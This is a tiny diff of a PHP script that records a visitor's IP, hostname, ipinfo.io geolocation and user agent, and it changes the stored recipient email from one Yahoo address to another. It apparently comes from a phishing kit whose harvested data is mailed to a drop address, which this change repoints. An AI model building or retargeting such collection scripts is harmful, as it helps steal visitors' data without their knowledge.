@@ -5,7 +5,7 @@ $hostname = gethostbyaddr($ip);
 $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
 $browser = $_SERVER['HTTP_USER_AGENT'];
 
-$myemail = 'rslt89@yahoo.com';
+$myemail = 'hasan_ashii@yahoo.com';
 
 	
 $response           = array(); 
